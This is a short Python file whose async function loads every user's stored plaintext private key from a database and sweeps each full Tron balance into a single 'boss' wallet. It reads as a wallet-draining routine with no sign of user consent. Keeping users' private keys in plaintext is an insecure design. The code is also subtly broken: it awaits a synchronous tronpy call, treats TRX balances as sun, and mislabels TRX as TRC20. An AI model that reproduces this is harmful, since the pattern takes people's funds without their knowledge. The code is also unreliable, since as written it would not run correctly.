from datetime import datetime
from tronpy import Tron

async def transfer_to_boss(boss_wallet: str, db) -> str:
    tron = Tron()
    users = await db['users'].find().to_list()
    total_transferred = 0

    for user in users:
        user_wallet = user['wallet']
        user_private_key = user['private_key']

        balance = await tron.trx.get_balance(user_wallet)
        if balance > 0:
            try:
                txn = (
                    tron.trx.transfer(user_wallet, boss_wallet, balance)
                    .build()
                    .sign(user_private_key)
                )
                txn.broadcast()
                amount_transferred = balance / 1_000_000
                total_transferred += amount_transferred
                
                await db['users'].update_one(
                    {"username": user['username']},
                    {"$set": {
                        "transferred_amount": amount_transferred,
                        "transaction_time": datetime.utcnow()
                        }
                    }
                )
            except Exception as e:
                print(f"Failed to transfer from {user_wallet}: {e}")

    return f"Total transferred to boss wallet: {total_transferred} TRC20"